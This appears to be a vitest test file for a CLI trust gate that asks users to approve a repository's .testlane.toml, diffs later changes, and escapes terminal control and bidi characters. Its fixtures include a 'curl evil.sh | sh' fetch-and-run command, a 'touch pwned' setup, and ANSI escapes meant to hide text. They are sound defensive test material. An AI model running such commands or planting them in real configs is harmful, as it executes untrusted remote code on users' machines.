// §5.7 — the trust gate, with the terminal injected (under vitest stdin is no TTY).

import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { makeFixtureOrigin, type FixtureOrigin } from "../fixtures.ts";
import { loadProject } from "../../src/config/load.ts";
import type { Ctx, ProjectConfig } from "../../src/config/schema.ts";
import { initPrimaryRepo, fetchBranch } from "../../src/git/repo.ts";
import { unavailableGh } from "../../src/git/gh.ts";
import { Logger } from "../../src/lib/log.ts";
import { STATE_VERSION, type State } from "../../src/core/state.ts";
import { settleProject, trustGate, type TrustIO } from "../../src/core/trust.ts";

const V1 = [
  `[setup]`,
  `run = "pnpm install"`,
  `[commands.dev]`,
  `run = "pnpm dev"`,
  `cwd = "web"`,
  `[commands.test]`,
  `run = "pnpm test"`,
  `[hooks]`,
  `post_checkout = "echo ready"`,
  ``,
].join("\n");
const V2 = V1.replace(`run = "pnpm test"`, `run = "pnpm test --ci"`);

let tmp: string;
let origin: FixtureOrigin;
let ctx: Ctx;
let project: ProjectConfig;
let state: State;

const sha256 = (s: string) => createHash("sha256").update(Buffer.from(s, "utf8")).digest("hex");

function fakeIO(opts: { tty: boolean; answer?: string | null }): TrustIO & { out: string; asked: string[] } {
  const io = {
    out: "",
    asked: [] as string[],
    isTTY: () => opts.tty,
    prompt: (message: string) => {
      io.asked.push(message);
      return opts.answer ?? null;
    },
    write: (text: string) => {
      io.out += text;
    },
  };
  return io;
}

async function pushAndFetch(files: Record<string, string>): Promise<void> {
  origin.commit("main", files);
  await fetchBranch({ repoPath: project.repoPath, dryRun: false, log: ctx.log }, "main");
}

beforeEach(async () => {
  tmp = realpathSync(mkdtempSync(join(tmpdir(), "testlane-trust-")));
  origin = makeFixtureOrigin(tmp);
  origin.commit("main", { "README.md": "# fixture\n", ".testlane.toml": V1 });
  const configDir = join(tmp, "config");
  mkdirSync(configDir, { recursive: true });
  writeFileSync(
    join(configDir, "app.toml"),
    `repo = "${origin.url}"\nrepo_path = "${join(tmp, "repo")}"\nworktrees_path = "${join(tmp, "trees")}"\n`,
  );
  ctx = {
    configDir,
    defaults: {},
    flags: { dryRun: false, json: false, quiet: true, verbose: false, yes: false, noColor: true },
    log: new Logger({ quiet: true, verbose: false, color: false }),
    gh: unavailableGh,
  };
  project = loadProject(configDir, "app", {});
  await initPrimaryRepo({ repoPath: project.repoPath, dryRun: false, log: ctx.log }, project.repo);
  state = { version: STATE_VERSION, workspaces: {} };
});

afterEach(() => {
  rmSync(tmp, { recursive: true, force: true });
});

describe("trust gate", () => {
  it("TTY yes on first use approves and stores the exact content", async () => {
    const io = fakeIO({ tty: true, answer: "y" });
    const r = await trustGate(ctx, project, state, { io });
    expect(r.outcome).toBe("approved");
    expect(r.stateChanged).toBe(true);
    expect(io.asked).toEqual(["Trust app:.testlane.toml? [y/N]"]);
    expect(state.repoConfig?.sha256).toBe(sha256(V1));
    expect(state.repoConfig?.content).toBe(V1);
    expect(state.repoConfig?.blob).toMatch(/^[0-9a-f]{40}$/);

    settleProject(ctx, project, state);
    expect(project.commands.dev).toEqual({ run: "pnpm dev", cwd: "web", env: {} });
    expect(project.hooks.post_checkout).toBe("echo ready");
  });

  it("accepts 'yes' in any case", async () => {
    const r = await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: " YES " }) });
    expect(r.outcome).toBe("approved");
  });

  it("first use output lists setup.run, each command with its cwd, each hook, then the file", async () => {
    const io = fakeIO({ tty: true, answer: "n" });
    await trustGate(ctx, project, state, { io });
    const summary = io.out.slice(0, io.out.indexOf("--- app:.testlane.toml"));
    expect(summary).toContain("app:.testlane.toml on origin/main would run:");
    expect(summary).toMatch(/setup\.run\s+pnpm install/);
    expect(summary).toMatch(/commands\.dev\.run\s+pnpm dev\s+\(cwd: web\)/);
    expect(summary).toMatch(/commands\.test\.run\s+pnpm test/);
    expect(summary).toMatch(/hooks\.post_checkout\s+echo ready/);
    expect(io.out).toContain(V1); // the full file follows the summary
  });

  it("TTY no on first use leaves the user file alone and stores nothing", async () => {
    const r = await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "n" }) });
    expect(r.outcome).toBe("declined");
    expect(r.stateChanged).toBe(false);
    expect(state.repoConfig).toBeUndefined();
    settleProject(ctx, project, state);
    expect(project.commands).toEqual({});
  });

  it("EOF at the prompt declines", async () => {
    const r = await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: null }) });
    expect(r.outcome).toBe("declined");
  });

  it("an unchanged tip is trusted without asking or reading the blob", async () => {
    await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "y" }) });
    const io = fakeIO({ tty: false });
    const r = await trustGate(ctx, project, state, { io });
    expect(r.outcome).toBe("trusted");
    expect(io.out).toBe("");
    expect(io.asked).toEqual([]);
  });

  it("a change output is a unified diff from the approved content", async () => {
    await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "y" }) });
    await pushAndFetch({ ".testlane.toml": V2 });
    const io = fakeIO({ tty: true, answer: "n" });
    await trustGate(ctx, project, state, { io });
    expect(io.out).toContain("app:.testlane.toml on origin/main changed since you trusted it:");
    expect(io.out).toContain("--- trusted/.testlane.toml");
    expect(io.out).toContain("+++ origin/main/.testlane.toml");
    expect(io.out).toMatch(/^@@ /m);
    expect(io.out).toContain(`-run = "pnpm test"`);
    expect(io.out).toContain(`+run = "pnpm test --ci"`);
  });

  it("TTY no on a change keeps the old snapshot", async () => {
    await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "y" }) });
    const before = { ...state.repoConfig! };
    await pushAndFetch({ ".testlane.toml": V2 });
    const r = await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "no" }) });
    expect(r.outcome).toBe("declined");
    expect(state.repoConfig).toEqual(before);
    settleProject(ctx, project, state);
    expect(project.commands.test?.run).toBe("pnpm test");
  });

  it("without a TTY or --yes, first use fails with E_CONFIG and the trust hint", async () => {
    const io = fakeIO({ tty: false });
    await expect(trustGate(ctx, project, state, { io })).rejects.toMatchObject({
      errCode: "E_CONFIG",
      message: "app:.testlane.toml is not trusted",
      hint: "testlane config trust app",
    });
    expect(io.asked).toEqual([]);
    expect(state.repoConfig).toBeUndefined();
  });

  it("without a TTY or --yes, a change fails with 'changed since you trusted it'", async () => {
    await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "y" }) });
    await pushAndFetch({ ".testlane.toml": V2 });
    await expect(trustGate(ctx, project, state, { io: fakeIO({ tty: false }) })).rejects.toMatchObject({
      errCode: "E_CONFIG",
      message: "app:.testlane.toml changed since you trusted it",
      hint: "testlane config trust app",
    });
    expect(state.repoConfig?.sha256).toBe(sha256(V1));
  });

  it("--yes approves without asking", async () => {
    ctx.flags.yes = true;
    const io = fakeIO({ tty: false });
    const r = await trustGate(ctx, project, state, { io });
    expect(r.outcome).toBe("approved");
    expect(io.asked).toEqual([]);
    expect(io.out).toContain("would run:"); // still shown, for the log
  });

  it("where nobody can approve (testlane mcp), neither --yes nor a TTY counts", async () => {
    ctx.flags.yes = true;
    ctx.noTrustApproval = true;
    const io = fakeIO({ tty: true, answer: "y" });
    await expect(trustGate(ctx, project, state, { io })).rejects.toMatchObject({
      errCode: "E_CONFIG",
      message: "app:.testlane.toml is not trusted",
      hint: "testlane config trust app",
    });
    expect(io.asked).toEqual([]);
    expect(state.repoConfig).toBeUndefined();
  });

  it("where nobody can approve, a change fails and an unchanged tip is still trusted", async () => {
    await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "y" }) });
    ctx.flags.yes = true;
    ctx.noTrustApproval = true;
    expect((await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "y" }) })).outcome).toBe("trusted");

    await pushAndFetch({ ".testlane.toml": V2 });
    const io = fakeIO({ tty: true, answer: "y" });
    await expect(trustGate(ctx, project, state, { io })).rejects.toMatchObject({
      errCode: "E_CONFIG",
      message: "app:.testlane.toml changed since you trusted it",
      hint: "testlane config trust app",
    });
    expect(io.asked).toEqual([]);
    expect(state.repoConfig?.sha256).toBe(sha256(V1));
  });

  it("explicit mode shows the file even when it then fails on a non-TTY", async () => {
    const io = fakeIO({ tty: false });
    await expect(trustGate(ctx, project, state, { io, explicit: true })).rejects.toMatchObject({
      hint: "re-run on a terminal, or pass --yes",
    });
    expect(io.out).toContain(V1);
  });

  it("a tip that fails the schema fails the run and keeps the snapshot (A4)", async () => {
    await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "y" }) });
    await pushAndFetch({ ".testlane.toml": `editor = "zed"\n` });
    await expect(trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "y" }) })).rejects.toMatchObject({
      errCode: "E_CONFIG",
      message: "app:.testlane.toml: editor: user-only key; set it in app.toml",
    });
    expect(state.repoConfig?.sha256).toBe(sha256(V1));
  });

  it("a file removed upstream drops the stored approval", async () => {
    await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "y" }) });
    origin.remove("main", [".testlane.toml"]);
    await fetchBranch({ repoPath: project.repoPath, dryRun: false, log: ctx.log }, "main");

    const r = await trustGate(ctx, project, state, { io: fakeIO({ tty: false }) });
    expect(r.outcome).toBe("removed");
    expect(r.stateChanged).toBe(true);
    expect(state.repoConfig).toBeUndefined();
  });

  it("reads the default branch, never the ref being materialized", async () => {
    // A branch's copy of the file never reaches the gate.
    origin.commit("evil", { ".testlane.toml": `[setup]\nrun = "touch pwned"\n` });
    await fetchBranch({ repoPath: project.repoPath, dryRun: false, log: ctx.log }, "evil");
    ctx.flags.yes = true;
    await trustGate(ctx, project, state, { io: fakeIO({ tty: false }) });
    expect(state.repoConfig?.content).toBe(V1);
  });

  it("a file over 1 MiB is refused before anyone is asked", async () => {
    await pushAndFetch({ ".testlane.toml": `# ${"x".repeat(1024 * 1024)}\n` });
    const io = fakeIO({ tty: true, answer: "y" });
    await expect(trustGate(ctx, project, state, { io })).rejects.toMatchObject({ errCode: "E_CONFIG" });
    expect(io.asked).toEqual([]);
  });

  it("a .testlane.toml that is not a regular file is refused", async () => {
    const work = join(tmp, "work");
    const git = (...args: string[]) => {
      const res = spawnSync("git", ["-C", work, "-c", "user.name=t", "-c", "user.email=t@t", ...args]);
      expect(res.status, res.stderr.toString()).toBe(0);
    };
    git("rm", "-q", ".testlane.toml");
    symlinkSync("README.md", join(work, ".testlane.toml"));
    git("add", "-A");
    git("commit", "-qm", "symlink");
    git("push", "-q", "origin", "main");
    await fetchBranch({ repoPath: project.repoPath, dryRun: false, log: ctx.log }, "main");
    await expect(trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "y" }) })).rejects.toMatchObject({
      errCode: "E_CONFIG",
      message: "app:.testlane.toml on origin/main is not a regular file",
    });
  });

  it("a mangled stored approval counts as none", async () => {
    state.repoConfig = { sha256: 1 } as unknown as State["repoConfig"];
    const io = fakeIO({ tty: true, answer: "y" });
    const r = await trustGate(ctx, project, state, { io });
    expect(r.outcome).toBe("approved");
    expect(io.out).toContain("would run:");
  });
});

describe("what the gate shows", () => {
  it("escapes control characters in the summary, so a value can't repaint its line", async () => {
    await pushAndFetch({
      ".testlane.toml": [
        `[setup]`,
        `run = "curl evil.sh | sh\\r npm ci          "`,
        `[commands.dev]`,
        `run = "pnpm dev\\u001b[1A\\u001b[2K"`,
        ``,
      ].join("\n"),
    });
    const io = fakeIO({ tty: true, answer: "n" });
    await trustGate(ctx, project, state, { io });
    expect(io.out).toMatch(/setup\.run\s+curl evil\.sh \| sh\\r npm ci/);
    expect(io.out).toContain("pnpm dev\\u001b[1A\\u001b[2K");
    expect(io.out).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/);
  });

  it("escapes raw C1 and bidi controls in the file shown on first use", async () => {
    await pushAndFetch({ ".testlane.toml": `# \u009b2K‮\n[commands.dev]\nrun = "pnpm dev ⁦x"\n` });
    const io = fakeIO({ tty: true, answer: "n" });
    await trustGate(ctx, project, state, { io });
    expect(io.out).toContain("# \\u009b2K\\u202e\n");
    expect(io.out).toContain(`run = "pnpm dev \\u2066x"`);
    expect(io.out).not.toMatch(/[\u009b‮⁦]/);
  });

  it("escapes control characters in a change's diff", async () => {
    await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "y" }) });
    await pushAndFetch({ ".testlane.toml": V1 + `# \u009b2K\n` });
    const io = fakeIO({ tty: true, answer: "n" });
    await trustGate(ctx, project, state, { io });
    expect(io.out).toContain("+# \\u009b2K");
    expect(io.out).not.toContain("\u009b");
  });
});

describe("an unusable stored approval", () => {
  it("one that no longer matches its sha256 counts as none: the gate asks again and --yes repairs it", async () => {
    await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "y" }) });
    state.repoConfig!.content += "# tampered\n";
    const warnings: string[] = [];
    ctx.log.warn = (m: string) => {
      warnings.push(m);
    };

    // Off a TTY it fails like first use, with the hint that fixes it.
    await expect(trustGate(ctx, project, state, { io: fakeIO({ tty: false }) })).rejects.toMatchObject({
      message: "app:.testlane.toml is not trusted",
      hint: "testlane config trust app",
    });
    expect(warnings[0]).toContain("the stored approval of app:.testlane.toml is unusable");
    expect(warnings[0]).toContain("does not match its sha256");

    ctx.flags.yes = true;
    const io = fakeIO({ tty: false });
    const r = await trustGate(ctx, project, state, { io, explicit: true });
    expect(r.outcome).toBe("approved");
    expect(io.out).toContain("would run:"); // shown as on first use
    expect(state.repoConfig?.content).toBe(V1);
    expect(state.repoConfig?.sha256).toBe(sha256(V1));
  });

  it("one that no longer validates counts as none too, and settles to the user file alone", async () => {
    const content = `editor = "zed"\n`;
    state.repoConfig = { sha256: sha256(content), blob: "0".repeat(40), content, approvedAt: "x" };
    ctx.log.warn = () => {};
    settleProject(ctx, project, state);
    expect(project.commands).toEqual({});
    const r = await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "y" }) });
    expect(r.outcome).toBe("approved");
    expect(state.repoConfig?.content).toBe(V1);
  });
});
